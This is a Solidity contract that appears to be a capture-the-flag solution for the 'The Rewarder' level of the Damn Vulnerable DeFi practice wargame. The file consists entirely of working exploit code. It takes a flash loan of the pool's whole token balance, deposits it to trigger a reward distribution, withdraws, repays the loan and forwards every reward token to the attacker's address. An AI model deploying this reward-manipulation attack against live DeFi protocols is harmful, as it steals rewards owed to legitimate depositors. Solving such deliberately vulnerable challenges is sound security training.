// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";

interface IFlashLoanderPool {
    function liquidityToken() external returns (DamnValuableToken);

    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);

    function rewardToken() external returns (RewardToken);
}

contract HackTheRewarder {
    IFlashLoanderPool private flashPool;
    ITheRewarderPool private rewardPool;
    DamnValuableToken private liqToken;
    RewardToken private rewardToken;

    address private player;

    constructor(
        IFlashLoanderPool _flashPool,
        ITheRewarderPool _rewardPool,
        address payable _player
    ) {
        flashPool = _flashPool;
        rewardPool = _rewardPool;
        liqToken = flashPool.liquidityToken();
        rewardToken = rewardPool.rewardToken();
        player = _player;
    }

    function hack() public {
        // borrow total supply
        flashPool.flashLoan(liqToken.balanceOf(address(flashPool)));
    }

    function receiveFlashLoan(uint256 amount) public {
        // deposit to TheRewarderPool
        liqToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        // claim the rewards
        rewardPool.distributeRewards();

        // withdraw the tokens
        rewardPool.withdraw(amount);

        // repay the debt
        liqToken.transfer(address(flashPool), amount);

        // transfer all rewards to the player
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}

// msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
